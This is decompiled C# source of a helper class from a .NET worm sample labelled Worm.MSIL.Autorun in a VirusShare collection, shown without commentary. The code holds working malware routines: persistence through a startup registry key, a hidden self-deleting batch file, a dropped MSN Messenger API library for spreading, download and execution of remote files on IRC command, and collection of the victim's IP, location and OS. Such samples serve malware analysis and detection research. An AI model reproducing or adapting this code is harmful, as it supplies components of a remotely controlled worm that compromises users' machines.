// Decompiled with JetBrains decompiler
// Type: explorer.misc
// Assembly: explorer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 56E5CD67-A795-400A-AA93-F7890471D495
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.ig-2c86700b4d3a736629e63a7f91f6e488e611145530107c5a2b53ad8867079764.exe

using explorer.Properties;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;

namespace explorer
{
  internal class misc
  {
    public static bool startupIsInfected(string name) => config.infecting_startup_regkey.GetValue(name) != null;

    public static void setInfected(string name, string path, bool value)
    {
      RegistryKey infectingStartupRegkey = config.infecting_startup_regkey;
      if (misc.startupIsInfected(name))
      {
        if (value)
          return;
        infectingStartupRegkey.DeleteValue(name);
      }
      else
      {
        if (!value)
          return;
        infectingStartupRegkey.SetValue(name, (object) ("\"" + path + "\""));
      }
    }

    public static void copyMsnApi(string path) => new BinaryWriter((Stream) System.IO.File.Open(path, FileMode.Create)).Write(Resources.Interop_MessengerAPI);

    public static void batRemove(string store, string remove)
    {
      StreamWriter streamWriter = new StreamWriter(store);
      streamWriter.WriteLine("@echo off");
      streamWriter.WriteLine(":a");
      streamWriter.WriteLine("del \"" + remove + "\"");
      streamWriter.WriteLine("IF EXIST \"" + remove + "\" GOTO a");
      streamWriter.WriteLine("del %0");
      streamWriter.Close();
      new Process()
      {
        EnableRaisingEvents = false,
        StartInfo = {
          WindowStyle = ProcessWindowStyle.Hidden,
          FileName = store
        }
      }.Start();
    }

    public static string pathfromexe(string path) => path.Substring(0, path.LastIndexOf('\\'));

    public static bool download(string url, string loc, irc irc)
    {
      WebClient webClient = new WebClient();
      try
      {
        webClient.DownloadFile(url, loc);
        return true;
      }
      catch (Exception ex)
      {
        irc.teller.tell(config.channel, "Download", "Download failed, execption thrown: " + ex.Message, true, false, false);
        return false;
      }
    }

    public static void exec(string path, irc irc)
    {
      try
      {
        string str1 = "";
        string[] strArray;
        if (path.Contains<char>(' '))
        {
          strArray = path.Split(' ');
          str1 = "";
          int num = 0;
          foreach (string str2 in strArray)
          {
            if (num != 0)
              str1 = str1 + str2 + " ";
            ++num;
          }
        }
        else
          strArray = new string[1]{ path };
        new Process()
        {
          EnableRaisingEvents = false,
          StartInfo = {
            FileName = strArray[0],
            Arguments = str1,
            UseShellExecute = true
          }
        }.Start();
      }
      catch (Exception ex)
      {
        irc.teller.tell(config.channel, "Execute", "Excecution failed, execption thrown: " + ex.Message, true, false, false);
      }
    }

    public static string getIP() => Locator.getIP();

    public static string getLoc() => Locator.getLoc();

    public static string getOS()
    {
      OperatingSystem osVersion = Environment.OSVersion;
      string os = "_____";
      switch (osVersion.Platform)
      {
        case PlatformID.Win32Windows:
          switch (osVersion.Version.Minor)
          {
            case 0:
              os = "Win95";
              break;
            case 10:
              os = "Win98";
              break;
            case 90:
              os = "WinME";
              break;
          }
          break;
        case PlatformID.Win32NT:
          switch (osVersion.Version.Major)
          {
            case 3:
              os = "WiNT3";
              break;
            case 4:
              os = "WiNT4";
              break;
            case 5:
              switch (osVersion.Version.Minor)
              {
                case 0:
                  os = "W2000";
                  break;
                case 1:
                  os = "WinXP";
                  break;
                case 2:
                  os = "S2003";
                  break;
              }
              break;
            case 6:
              switch (osVersion.Version.Minor)
              {
                case 0:
                  os = "Vista";
                  break;
                case 1:
                  os = "Wind7";
                  break;
              }
              break;
          }
          break;
      }
      return os;
    }

    public static string centerString(string addchars, string input, int totalStringLength)
    {
      string str1 = "";
      int times = (totalStringLength - input.Length) / 2;
      string str2 = str1 + misc.multipleChar(addchars, times) + input + misc.multipleChar(addchars, times);
      if ((totalStringLength - input.Length) % 2 != 0)
        str2 += addchars;
      return str2;
    }

    public static string formatString(
      string infront,
      string input,
      string inback,
      int totallength)
    {
      string str = "";
      int times = totallength - input.Length - infront.Length;
      return str + infront + input + misc.multipleChar(inback, times);
    }

    public static string multipleChar(string chartomultiply, int times)
    {
      string str = "";
      for (int index = 0; index != times; ++index)
        str += chartomultiply;
      return str;
    }

    public static string GetStringInBetween(
      string strBegin,
      string strEnd,
      string strSource,
      bool includeBegin,
      bool includeEnd)
    {
      string[] strArray = new string[2]{ "", "" };
      int num = strSource.IndexOf(strBegin);
      if (num != -1)
      {
        if (includeBegin)
          num -= strBegin.Length;
        strSource = strSource.Substring(num + strBegin.Length);
        int length = strSource.IndexOf(strEnd);
        if (length != -1)
        {
          if (includeEnd)
            length += strEnd.Length;
          strArray[0] = strSource.Substring(0, length);
          if (length + strEnd.Length < strSource.Length)
            strArray[1] = strSource.Substring(length + strEnd.Length);
        }
      }
      else
        strArray[1] = strSource;
      return strArray[0];
    }

    public static string nickGenerator(int Length)
    {
      string str1 = misc.md5(new Random().Next().ToString()).Substring(0, Length);
      string str2 = "";
      Random random = new Random();
      for (int startIndex = 0; startIndex < str1.Length; ++startIndex)
        str2 = random.Next(0, 2) != 1 ? str2 + str1.Substring(startIndex, 1) : str2 + str1.Substring(startIndex, 1).ToUpper();
      return str2;
    }

    public static string md5(string Data)
    {
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(Data));
      StringBuilder stringBuilder = new StringBuilder();
      foreach (byte num in hash)
        stringBuilder.AppendFormat("{0:x2}", (object) num);
      return stringBuilder.ToString();
    }
  }
}
